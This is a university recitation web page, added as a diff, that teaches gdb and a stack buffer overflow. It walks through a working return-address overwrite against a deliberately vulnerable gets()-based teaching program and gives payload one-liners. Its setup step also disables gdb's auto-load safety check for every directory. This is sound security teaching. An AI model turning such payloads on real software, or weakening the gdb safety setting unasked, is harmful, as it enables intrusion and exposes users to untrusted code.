@@ -1,0 +1,219 @@
+<html>
+<head>
+	<meta charset="utf-8">
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, content=no-cache">
+
+	<!-- Bootstrap CSS -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css" integrity="sha384-Zug+QiDoJOrZ5t4lssLdxGhVrurbmBWopoEl+M6BdEfwnCJZtKxi1KgxUyJq13dy" crossorigin="anonymous">
+	<link rel="stylesheet" href="sty2.css">
+
+  <title>Computer Systems Organization (Fall 2026) </title>
+</head>
+
+<body>
+<br>
+    <main role="main" class="container">
+      <header class="header clearfix">
+        <nav>
+          <ul class="nav nav-pills float-left">
+            <li class="nav-item">
+              <a class="nav-link " href="index.html">Home <span class="sr-only">(current)</span></a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="schedule.html">Schedule</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="labs/">Lab</a>
+            </li>
+          </ul>
+        </nav>
+	<div class="row">
+		<div class="col-sm-3"><img src="org.png" width=150></div>
+		<div class="col-sm-9">
+		<div class="row">
+        <h3 class="text-muted">Computer Systems Organization</h3>
+		</div>
+		<div class="row">
+			CSCI-UA.0201-030, Fall 2026
+		</div>
+		</div>
+	</div>
+      </header>
+
+<div id="content">
+<hr>
+
+<h2>Recitation: Binary Mystery &amp; Buffer Overflow</h2>
+
+<p>In this recitation you will practice reading x86-64 programs <em>at runtime</em> with <tt>gdb</tt>. You will inspect three short &ldquo;mystery&rdquo; functions and a program with a classic stack buffer overflow, and answer questions on Gradescope. Everything runs in a GitHub Codespace (an x86-64 Linux machine in the cloud), so the given binaries run natively and <tt>gdb</tt> works fully.</p>
+
+<ul>
+<li><a href="#setup">1. Set up your environment</a></li>
+<li><a href="#gdb">2. A quick gdb refresher</a></li>
+<li><a href="#mystery">3. The mystery functions (Q1&ndash;Q7)</a></li>
+<li><a href="#overflow">4. The buffer overflow (Q8&ndash;Q10)</a></li>
+<li><a href="#binfile">5. Writing and reading binary files</a></li>
+<li><a href="#handin">6. Submit on Gradescope</a></li>
+</ul>
+
+<hr>
+<h4 id="setup">1. Set up your environment</h4>
+
+<h5>Fork the examples repository</h5>
+<ol>
+<li>Log into <tt>github.com</tt> and open <a href="https://github.com/nyu-cso-fa26/binarylab-examples">nyu-cso-fa26/binarylab-examples</a>.</li>
+<li>Click the <b>Fork</b> button (top-right) and create a fork under your own account. You now have your own copy at <tt>https://github.com/&lt;your-username&gt;/binarylab-examples</tt>.</li>
+</ol>
+
+<h5>Start a Codespace on your fork</h5>
+<ol>
+<li>On <em>your fork</em>, click the green <b>Code</b> button, select the <b>Codespaces</b> tab, and click <b>Create codespace on main</b>. The first time, it takes a minute or two.</li>
+<li>A VS Code window opens in your browser with a terminal at the bottom (open one with <b>Terminal &rarr; New Terminal</b> if needed). Confirm you are on an x86-64 machine with <kbd>uname -m</kbd>, which should print <tt>x86_64</tt>.</li>
+</ol>
+<p>The default codespace image already has <tt>gcc</tt>, <tt>make</tt>, <tt>gdb</tt> and <tt>objdump</tt> installed &mdash; nothing to install.</p>
+
+<div class="bd-callout bd-callout-info">
+<p style="margin:0;"><b>Why fork instead of opening the repo directly?</b> A Codespace created on your personal fork is owned by <em>you</em> and billed to your own free monthly Codespaces allowance, and it does not depend on any organization setting. This is the most reliable way to make sure Codespaces works for everyone.</p>
+</div>
+
+<h5>One-time gdb setup</h5>
+<p>The repository ships a <tt>.gdbinit</tt> file (it turns on a nicer disassembly display and silences the <tt>debuginfod</tt> prompt). By default <tt>gdb</tt> refuses to load a <tt>.gdbinit</tt> from a project directory for security. Allow it by running this <b>once</b> in the terminal:</p>
+<pre>echo "set auto-load safe-path /" &gt;&gt; ~/.gdbinit</pre>
+<p>After this, starting <tt>gdb</tt> in the repository will automatically load its <tt>.gdbinit</tt>. (You can check it worked: <kbd>gdb</kbd> should not ask about <tt>debuginfod</tt>, and <kbd>show disassemble-next-line</kbd> should print <tt>on</tt>.)</p>
+
+<h5>Build the programs</h5>
+<pre>make</pre>
+<p>This builds <tt>mystery</tt>, <tt>mystery-sol</tt>, and <tt>exampleoverflow</tt>. You will use <tt>mystery-sol</tt> for Q1&ndash;Q7 and <tt>exampleoverflow</tt> for Q8&ndash;Q10.</p>
+
+<hr>
+<h4 id="gdb">2. A quick gdb refresher</h4>
+
+<p>Start the debugger on a program with <kbd>gdb ./mystery-sol</kbd>. Useful commands:</p>
+<pre>
+break <i>func</i>            set a breakpoint at the start of a function (e.g. break mystery1)
+run                     start the program; it stops at the next breakpoint
+continue  (or c)        resume until the next breakpoint
+nexti     (or ni)       execute one machine instruction (step over calls)
+stepi     (or si)       execute one machine instruction (step into calls)
+finish                  run until the current function returns, print its return value
+
+info registers <i>r</i>      show one register, e.g. info registers rsi
+print $rsi  (or p)      same thing as an expression; p/x $rsi prints it in hex
+
+x/10dw $rdi             examine memory: 10 decimal 4-byte words at the address in %rdi
+x/s   $rdi              examine memory as a C string
+x/gx  $rsp              examine one 8-byte value (giant, hex) at the stack pointer
+
+disas <i>func</i>           disassemble a function, e.g. disas get_input
+quit      (or q)        leave gdb
+</pre>
+
+<p>Recall the x86-64 calling convention: the first integer/pointer arguments are passed in
+<tt>%rdi</tt>, <tt>%rsi</tt>, <tt>%rdx</tt>, <tt>%rcx</tt>, &hellip; (use the 32-bit names <tt>%edi</tt>, <tt>%esi</tt>, &hellip; for <tt>int</tt> arguments), and a function returns its value in <tt>%rax</tt> (<tt>%eax</tt> for <tt>int</tt>).</p>
+
+<hr>
+<h4 id="mystery">3. The mystery functions (Q1&ndash;Q7)</h4>
+
+<p>Run <kbd>gdb ./mystery-sol</kbd>. Using the commands above, set a breakpoint at <tt>mystery1</tt>, <tt>mystery2</tt>, and <tt>mystery3</tt>, run the program, and inspect the arguments (in the registers), the memory they point to, and the return values. From that, work out what each function computes.</p>
+<p>Answer <b>Q1&ndash;Q7</b> on the Gradescope online assignment as you go.</p>
+
+<hr>
+<h4 id="overflow">4. The buffer overflow (Q8&ndash;Q10)</h4>
+
+<p>Now look at <tt>exampleoverflow</tt>, whose source is in the file <tt>exampleoverflow.c</tt>:</p>
+<pre>
+bool get_input()
+{
+    char buf[8];
+    gets(buf);                               /* NO bounds checking! */
+    return strcmp(buf, "supersecret") == 0;
+}
+
+void give_out_lots_of_money()
+{
+    printf("Congratulations! You have earned lots of $$$\n");
+    exit(0);
+}
+
+int main()
+{
+    if (get_input())
+        give_out_lots_of_money();
+    else
+        printf("sorry dude, you don't have the right password\n");
+    return 0;
+}
+</pre>
+
+<p><tt>gets()</tt> reads a whole line into <tt>buf</tt> without checking its length. <tt>buf</tt> is only 8 bytes, so a longer line runs off the end of <tt>buf</tt> and keeps writing <em>up the stack</em>, over <tt>get_input</tt>'s saved return address. By putting the right bytes there, you can make <tt>get_input</tt> &ldquo;return&rdquo; straight into <tt>give_out_lots_of_money()</tt> &mdash; without ever knowing the password.</p>
+
+<p>Use <tt>gdb</tt> to answer <b>Q8&ndash;Q10</b>:</p>
+<ul>
+<li><b>Q8</b> &mdash; the address of <tt>give_out_lots_of_money</tt> (the function you want to jump to): <kbd>info address give_out_lots_of_money</kbd>.</li>
+<li><b>Q9</b> &mdash; how many bytes of input sit between the start of <tt>buf</tt> and the saved return address: read it off <kbd>disas get_input</kbd>.</li>
+<li><b>Q10</b> &mdash; set a breakpoint at <tt>get_input</tt>'s <tt>ret</tt>, type a long run of <tt>A</tt>'s, and examine the saved return address with <kbd>x/gx $rsp</kbd> to see that you really did overwrite it.</li>
+</ul>
+
+<hr>
+<h4 id="binfile">5. Writing and reading binary files</h4>
+
+<p>Answering Q8&ndash;Q10 only requires reading the program with gdb. But to actually <em>carry out</em> the attack &mdash; make the program print the congratulations message with no password &mdash; you must feed it the raw bytes of <tt>give_out_lots_of_money</tt>'s address. For example <tt>0x401182</tt> is really the eight bytes</p>
+<pre>82 11 40 00 00 00 00 00</pre>
+<p>(x86-64 is <b>little-endian</b>, so the low byte comes first, and the high bytes are <tt>00</tt>). Several of those bytes are not characters you can type, so you build them in a file and feed the file to the program.</p>
+
+<div class="bd-callout bd-callout-warning">
+<p style="margin:0;"><b>Why a file, and not a command-line argument?</b> A command-line argument is a NUL-terminated string, so it can <em>never</em> contain a <tt>0x00</tt> byte &mdash; the argument would be cut off there. The shell's <tt>$(&hellip;)</tt> substitution also silently drops NUL bytes and trailing newlines. Since addresses contain <tt>0x00</tt> bytes, overflow payloads are fed through <b>standard input</b> (from a file), not as arguments.</p>
+</div>
+
+<h5>Writing a binary file</h5>
+<p>The easiest way to produce exact bytes is with Python. This writes 16 padding bytes (enough to fill <tt>buf</tt> and the saved <tt>%rbx</tt>, so the next 8 bytes land on the saved return address) followed by the 8-byte address of <tt>give_out_lots_of_money</tt>:</p>
+<pre>
+python3 -c "open('bad_input','wb').write(b'A'*16 + (0x401182).to_bytes(8,'little'))"
+</pre>
+<p>Here <tt>b'A'*16</tt> is sixteen <tt>0x41</tt> bytes, and <tt>(0x401182).to_bytes(8,'little')</tt> produces the eight address bytes <tt>82 11 40 00 00 00 00 00</tt>. (Use the address <em>you</em> found in Q8.)</p>
+<p>You can also do it with <tt>printf</tt>, writing each byte as <tt>\xHH</tt>:</p>
+<pre>
+printf 'AAAAAAAAAAAAAAAA\x82\x11\x40\x00\x00\x00\x00\x00' &gt; bad_input
+</pre>
+
+<h5>Reading (inspecting) a binary file</h5>
+<p>You cannot usefully <tt>cat</tt> a binary file &mdash; the unprintable bytes turn into garbage. Use a hex viewer instead:</p>
+<pre>
+xxd bad_input           # hex on the left, ASCII on the right, 16 bytes/line
+od -An -tx1 bad_input   # just the bytes, in hex
+wc -c bad_input         # byte count (should be 24 here)
+</pre>
+<p>For example, <kbd>xxd bad_input</kbd> prints:</p>
+<pre>
+00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000010: 8211 4000 0000 0000                      ..@.....
+</pre>
+<p>The 16 <tt>0x41</tt> (<tt>'A'</tt>) padding bytes, then the little-endian address, are exactly what you wrote.</p>
+
+<h5>Feeding the file to the program</h5>
+<p>Redirect the file into the program's standard input with <tt>&lt;</tt> (or pipe it in). Either of these runs the attack:</p>
+<pre>
+./exampleoverflow &lt; bad_input
+
+# or without making a file at all:
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*16 + (0x401182).to_bytes(8,'little'))" | ./exampleoverflow
+</pre>
+<p>If your bytes are right, the program prints</p>
+<pre>
+Congratulations! You have earned lots of $$$
+</pre>
+<p>even though you never typed the password &mdash; you hijacked its control flow.</p>
+
+<div class="bd-callout bd-callout-info">
+<p style="margin:0;"><b>A note on <tt>gets()</tt> and newlines.</b> <tt>gets()</tt> reads until it sees a newline (<tt>0x0a</tt>) or the end of the input, and it is happy to read <tt>0x00</tt> bytes along the way. The files written above contain no newline, so every byte is read. Just don't put a stray newline <em>in the middle</em> of your payload, or <tt>gets()</tt> will stop early.</p>
+</div>
+
+<hr>
+<h4 id="handin">6. Submit on Gradescope</h4>
+
+<p>Answer all 10 questions on the <b>Binary Mystery &amp; Overflow</b> online assignment on Gradescope. Each answer is something you read off <tt>gdb</tt> while the program is running, so have your Codespace terminal open as you go.</p>
+
+</div>
+</body>
+</html>
